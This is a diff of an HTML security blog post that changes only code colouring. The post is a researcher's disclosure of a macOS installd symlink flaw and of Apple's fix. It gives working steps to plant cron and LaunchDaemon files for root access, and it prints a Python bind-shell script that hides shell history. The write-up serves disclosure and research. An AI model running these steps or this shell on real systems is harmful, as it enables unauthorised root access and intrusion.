-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229939  getattrlist                            /Applications/Parcel.app/Contents/MacOS                                                                                                                               0.000005   lsd.4123091
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229945  getattrlist                            /Applications/Parcel.app/Contents/MacOS/Parcel                                                                                                                        0.000005   lsd.4123091
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>standard input<span style="color:#f92672">)</span>:21:27:01.229957  getattrlist                            /Applications/Parcel.app                                                                                                                                              0.000005   lsd.4123091
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229709  getxattr               <span style="color:#555">[</span> 93<span style="color:#555">]</span>           /Applications/Parcel.app                                                                                                                                              0.000017   lsd.4123091
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229719  access                       <span style="color:#555">(</span>___F<span style="color:#555">)</span>    /Applications/Parcel.app/Contents                                                                                                                                     0.000005   lsd.4123091
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229819  fstatat64                              <span style="color:#555">[</span>-2<span style="color:#555">]</span>//Applications/Parcel.app                                                                                                                                         0.000013   lsd.4123091
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229927  getattrlist                            /Applications/Parcel.app                                                                                                                                              0.000006   lsd.4123091
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229933  getattrlist                            /Applications/Parcel.app/Contents                                                                                                                                     0.000006   lsd.4123091
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229939  getattrlist                            /Applications/Parcel.app/Contents/MacOS                                                                                                                               0.000005   lsd.4123091
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229945  getattrlist                            /Applications/Parcel.app/Contents/MacOS/Parcel                                                                                                                        0.000005   lsd.4123091
+</span></span><span style="display:flex;"><span><span style="color:#555">(</span>standard input<span style="color:#555">)</span>:21:27:01.229957  getattrlist                            /Applications/Parcel.app                                                                                                                                              0.000005   lsd.4123091
 </span></span></code></pre></div><h2 id="bypassing-root-folder-permissions-in-app-store-installed-apps">
   Bypassing root folder permissions in App Store installed apps
   <a class="heading-link" href="#bypassing-root-folder-permissions-in-app-store-installed-apps">
@@ -452,33 +452,33 @@ Essentially what we can achieve with this is to drop any files that can be found
 <code>ln -s /opt/myname /Applications/Example.app/Contents/MacOS/Example</code>
 What will happen is that the symlink will be overwritten, when the installd daemon moves the file from the temporary location to the final. You can find the same behaviour if you experiment with the <code>mv</code> command:</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo aaa &gt; a
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#366">echo</span> aaa &gt; a
 </span></span><span style="display:flex;"><span>$ ln -s a b
 </span></span><span style="display:flex;"><span>$ ls -la
-</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
-</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">4</span> csaby  staff   <span style="color:#ae81ff">128</span> Sep <span style="color:#ae81ff">11</span> 16:16 .
-</span></span><span style="display:flex;"><span>drwxr-xr-x+ <span style="color:#ae81ff">50</span> csaby  staff  <span style="color:#ae81ff">1600</span> Sep <span style="color:#ae81ff">11</span> 16:16 ..
-</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> csaby  staff     <span style="color:#ae81ff">4</span> Sep <span style="color:#ae81ff">11</span> 16:16 a
-</span></span><span style="display:flex;"><span>lrwxr-xr-x   <span style="color:#ae81ff">1</span> csaby  staff     <span style="color:#ae81ff">1</span> Sep <span style="color:#ae81ff">11</span> 16:16 b -&gt; a
+</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">4</span> csaby  staff   <span style="color:#f60">128</span> Sep <span style="color:#f60">11</span> 16:16 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x+ <span style="color:#f60">50</span> csaby  staff  <span style="color:#f60">1600</span> Sep <span style="color:#f60">11</span> 16:16 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">4</span> Sep <span style="color:#f60">11</span> 16:16 a
+</span></span><span style="display:flex;"><span>lrwxr-xr-x   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">1</span> Sep <span style="color:#f60">11</span> 16:16 b -&gt; a
 </span></span><span style="display:flex;"><span>$ cat b
 </span></span><span style="display:flex;"><span>aaa
-</span></span><span style="display:flex;"><span>$ echo bbb &gt;&gt; b
+</span></span><span style="display:flex;"><span>$ <span style="color:#366">echo</span> bbb &gt;&gt; b
 </span></span><span style="display:flex;"><span>$ cat b
 </span></span><span style="display:flex;"><span>aaa
 </span></span><span style="display:flex;"><span>bbb
 </span></span><span style="display:flex;"><span>$ touch c
 </span></span><span style="display:flex;"><span>$ ls -l
-</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
-</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> csaby  staff  <span style="color:#ae81ff">8</span> Sep <span style="color:#ae81ff">11</span> 16:16 a
-</span></span><span style="display:flex;"><span>lrwxr-xr-x  <span style="color:#ae81ff">1</span> csaby  staff  <span style="color:#ae81ff">1</span> Sep <span style="color:#ae81ff">11</span> 16:16 b -&gt; a
-</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> csaby  staff  <span style="color:#ae81ff">0</span> Sep <span style="color:#ae81ff">11</span> 16:25 c
+</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">8</span> Sep <span style="color:#f60">11</span> 16:16 a
+</span></span><span style="display:flex;"><span>lrwxr-xr-x  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">1</span> Sep <span style="color:#f60">11</span> 16:16 b -&gt; a
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> csaby  staff  <span style="color:#f60">0</span> Sep <span style="color:#f60">11</span> 16:25 c
 </span></span><span style="display:flex;"><span>$ mv c b
 </span></span><span style="display:flex;"><span>$ ls -la
-</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
-</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">4</span> csaby  staff   <span style="color:#ae81ff">128</span> Sep <span style="color:#ae81ff">11</span> 16:25 .
-</span></span><span style="display:flex;"><span>drwxr-xr-x+ <span style="color:#ae81ff">50</span> csaby  staff  <span style="color:#ae81ff">1600</span> Sep <span style="color:#ae81ff">11</span> 16:16 ..
-</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> csaby  staff     <span style="color:#ae81ff">8</span> Sep <span style="color:#ae81ff">11</span> 16:16 a
-</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#ae81ff">1</span> csaby  staff     <span style="color:#ae81ff">0</span> Sep <span style="color:#ae81ff">11</span> 16:25 b
+</span></span><span style="display:flex;"><span>total <span style="color:#f60">8</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#f60">4</span> csaby  staff   <span style="color:#f60">128</span> Sep <span style="color:#f60">11</span> 16:25 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x+ <span style="color:#f60">50</span> csaby  staff  <span style="color:#f60">1600</span> Sep <span style="color:#f60">11</span> 16:16 ..
+</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">8</span> Sep <span style="color:#f60">11</span> 16:16 a
+</span></span><span style="display:flex;"><span>-rw-r--r--   <span style="color:#f60">1</span> csaby  staff     <span style="color:#f60">0</span> Sep <span style="color:#f60">11</span> 16:25 b
 </span></span></code></pre></div><ol start="2">
 <li>Even if we create a hardlink instead of symlink, that will be overwritten like in the 1st case.</li>
 <li>As noted earlier we can’t write to folder protected by SIP.</li>
@@ -541,7 +541,7 @@ What will happen is that the symlink will be overwritten, when the installd daem
   </a>
 </h3>
 <p>I had no prior knowledge of either Objective C or Swift, but looking on the following syntax for Obj-C, freaked me out:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>myFraction <span style="color:#f92672">=</span> [[Fraction alloc] init];
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>myFraction <span style="color:#555">=</span> [[Fraction alloc] init];
 </span></span></code></pre></div><p>This is how you call methods of objects and pass parameters. It’s against every syntax I ever knew and I just didn’t want to consume this. So I looked at Swift which looked much nicer in this space and decided to go with that. :)</p>
 <h3 id="learning-swift">
   Learning Swift
@@ -610,26 +610,26 @@ What will happen is that the symlink will be overwritten, when the installd daem
   </a>
 </h2>
 <p>The Crontab Creator app contains a file named ‘root’ as an example for crontab file, along with 9 others. The content is the following:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* * * * * /Applications/Scripts/backup-apps.sh
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* * * * * /Applications/Scripts/backup-apps.sh
 </span></span></code></pre></div><p>Obviously this script doesn’t exists by default, but you can easily create it in the <code>/Application</code> folder, as you have write access, and at that point you can put anything you want into it.</p>
 <p>The steps for the privilege escalation are as follows. First we need to create the app folder structure, and place a symlink there.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /Applications/
-</span></span><span style="display:flex;"><span>mkdir <span style="color:#e6db74">&#34;Crontab Creator.app&#34;</span>
-</span></span><span style="display:flex;"><span>cd Crontab<span style="color:#ae81ff">\ </span>Creator.app/
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
+</span></span><span style="display:flex;"><span>mkdir <span style="color:#c30">&#34;Crontab Creator.app&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Crontab<span style="color:#c30;font-weight:bold">\ </span>Creator.app/
 </span></span><span style="display:flex;"><span>mkdir Contents
-</span></span><span style="display:flex;"><span>cd Contents/
+</span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Contents/
 </span></span><span style="display:flex;"><span>ln -s /usr/lib/cron/tabs/ Resources
 </span></span></code></pre></div><p>Then we need to create the script file, which will be run every minute, I choose to run Terminal.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /Applications/
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
 </span></span><span style="display:flex;"><span>mkdir Scripts
-</span></span><span style="display:flex;"><span>cd Scripts/
-</span></span><span style="display:flex;"><span>echo /Applications/Utilities/Terminal.app/Contents/MacOS/Terminal &gt; backup-apps.sh
+</span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Scripts/
+</span></span><span style="display:flex;"><span><span style="color:#366">echo</span> /Applications/Utilities/Terminal.app/Contents/MacOS/Terminal &gt; backup-apps.sh
 </span></span><span style="display:flex;"><span>chmod +x backup-apps.sh
 </span></span></code></pre></div><p>Then we need to install the application from the store. We can do this either via the GUI, or we can do it via the CLI if we install <code>brew</code>, and then <code>mas</code>.</p>
 <p>Commands:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/ruby -e <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/ruby -e <span style="color:#c30">&#34;</span><span style="color:#069;font-weight:bold">$(</span>curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install<span style="color:#069;font-weight:bold">)</span><span style="color:#c30">&#34;</span>
 </span></span><span style="display:flex;"><span>brew install mas
-</span></span><span style="display:flex;"><span>mas install <span style="color:#ae81ff">1438725196</span>
+</span></span><span style="display:flex;"><span>mas install <span style="color:#f60">1438725196</span>
 </span></span></code></pre></div><p>In summary utilizing the previous vulnerabilities we can drop the file into the crontab folder, create the script with starting Terminal inside it, and in a minute we got a popup and root access.</p>
 <h3 id="the-fix">
   The fix
@@ -657,8 +657,8 @@ What will happen is that the symlink will be overwritten, when the installd daem
 <code>tar xvf embedded.pkg/Payload</code></li>
 <li>Embedded your file (it can be anywhere and anything):</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mkdir Example.app/Contents/test
-</span></span><span style="display:flex;"><span>$ echo aaaa &gt; Example.app/Contents/test/a
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mkdir Example.app/Contents/test
+</span></span><span style="display:flex;"><span>$ <span style="color:#366">echo</span> aaaa &gt; Example.app/Contents/test/a
 </span></span></code></pre></div><ol start="5">
 <li>Recompress the app:
 <code>find ./Example.app | cpio -o --format odc | gzip -c &gt; Payload</code></li>
@@ -693,7 +693,7 @@ Developers should build-in some verification of Apple IDs. I’m not sure that i
 </h3>
 <p>This year (2019) I’ve been talking to a few people about this, and it hit me, that I didn’t do any further checks if symlinks are completely broken (during the installation) or not. It turned out that they are still a thing.</p>
 <p>The way the fix is working is that <code>installd</code> has no longer access to the crontab folder (<code>/usr/lib/cron/tabs</code>) even running as root, so it won’t be able to create files there. I’m not even sure that this is a direct fix for my POC or some other coincidence. We can find the related error message in <code>/var/log/install.log</code> (you can use the Console app for viewing logs):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-01-31 20:44:49+01 csabymac shove<span style="color:#f92672">[</span>1057<span style="color:#f92672">]</span>: <span style="color:#f92672">[</span>source<span style="color:#f92672">=</span>file<span style="color:#f92672">]</span> failed _RelinkFile<span style="color:#f92672">(</span>/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/401FEDFC-1D7B-4E47-A6E9-E26B83F8988F.activeSandbox/Root/Applications/Crontab Creator.app/Contents/Resources/peter, /private/var/at/tabs/peter<span style="color:#f92672">)</span>: Operation not permitted
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-01-31 20:44:49+01 csabymac shove<span style="color:#555">[</span>1057<span style="color:#555">]</span>: <span style="color:#555">[</span><span style="color:#033">source</span><span style="color:#555">=</span>file<span style="color:#555">]</span> failed _RelinkFile<span style="color:#555">(</span>/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/C/PKInstallSandboxManager/401FEDFC-1D7B-4E47-A6E9-E26B83F8988F.activeSandbox/Root/Applications/Crontab Creator.app/Contents/Resources/peter, /private/var/at/tabs/peter<span style="color:#555">)</span>: Operation not permitted
 </span></span></code></pre></div><h3 id="the-problem">
   The problem
   <a class="heading-link" href="#the-problem">
@@ -722,44 +722,44 @@ Developers should build-in some verification of Apple IDs. I’m not sure that i
 <p><img src="https://theevilbit.github.io/images/Getting_root_with_benign_AppStore_apps/Screenshot%202019-02-12%20at%2010.39.44.png" alt="image6"></p>
 <p>It is really built along the same line as the previous one, but in this case for LaunchDaemons.</p>
 <p>The way to utilize it is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /Applications/
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
 </span></span><span style="display:flex;"><span>mkdir “StartUp.app”
-</span></span><span style="display:flex;"><span>cd StartUp.app/
+</span></span><span style="display:flex;"><span><span style="color:#366">cd</span> StartUp.app/
 </span></span><span style="display:flex;"><span>mkdir Contents
-</span></span><span style="display:flex;"><span>cd Contents/
+</span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Contents/
 </span></span><span style="display:flex;"><span>ln -s /Library/LaunchDaemons/ Resources
-</span></span><span style="display:flex;"><span>cd /Applications/
+</span></span><span style="display:flex;"><span><span style="color:#366">cd</span> /Applications/
 </span></span><span style="display:flex;"><span>mkdir Scripts
-</span></span><span style="display:flex;"><span>cd Scripts/
+</span></span><span style="display:flex;"><span><span style="color:#366">cd</span> Scripts/
 </span></span></code></pre></div><p>Here you can create a sample.sh script that will run as root after booting up. For myself I put a bind shell into that script, and after login, connecting to it I got a root shell, but it’s up to you what you put there.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#sample.sh</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#sample.sh</span>
 </span></span><span style="display:flex;"><span>python /Applications/Scripts/bind.py
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#bind.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Python Bind TCP PTY Shell - testing version
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">infodox - insecurety.net (2013)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Binds a PTY to a TCP port on the host it is ran on.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#bind.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">Python Bind TCP PTY Shell - testing version
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">infodox - insecurety.net (2013)
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">Binds a PTY to a TCP port on the host it is ran on.
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">pty</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">socket</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>lport <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span> <span style="color:#75715e"># XXX: CHANGEME</span>
+</span></span><span style="display:flex;"><span>lport <span style="color:#555">=</span> <span style="color:#f60">31337</span> <span style="color:#09f;font-style:italic"># XXX: CHANGEME</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
-</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>bind((<span style="color:#e6db74">&#39;&#39;</span>, lport))
-</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>    (rem, addr) <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>accept()
-</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(rem<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(rem<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(rem<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>putenv(<span style="color:#e6db74">&#34;HISTFILE&#34;</span>,<span style="color:#e6db74">&#39;/dev/null&#39;</span>)
-</span></span><span style="display:flex;"><span>    pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
-</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">main</span>():
+</span></span><span style="display:flex;"><span>    s <span style="color:#555">=</span> socket<span style="color:#555">.</span>socket(socket<span style="color:#555">.</span>AF_INET, socket<span style="color:#555">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>bind((<span style="color:#c30">&#39;&#39;</span>, lport))
+</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>listen(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>    (rem, addr) <span style="color:#555">=</span> s<span style="color:#555">.</span>accept()
+</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>dup2(rem<span style="color:#555">.</span>fileno(),<span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>dup2(rem<span style="color:#555">.</span>fileno(),<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>dup2(rem<span style="color:#555">.</span>fileno(),<span style="color:#f60">2</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#555">.</span>putenv(<span style="color:#c30">&#34;HISTFILE&#34;</span>,<span style="color:#c30">&#39;/dev/null&#39;</span>)
+</span></span><span style="display:flex;"><span>    pty<span style="color:#555">.</span>spawn(<span style="color:#c30">&#34;/bin/bash&#34;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>close()
 </span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#033">__name__</span> <span style="color:#555">==</span> <span style="color:#c30">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><h3 id="reporting-to-apple-1">
   Reporting to Apple
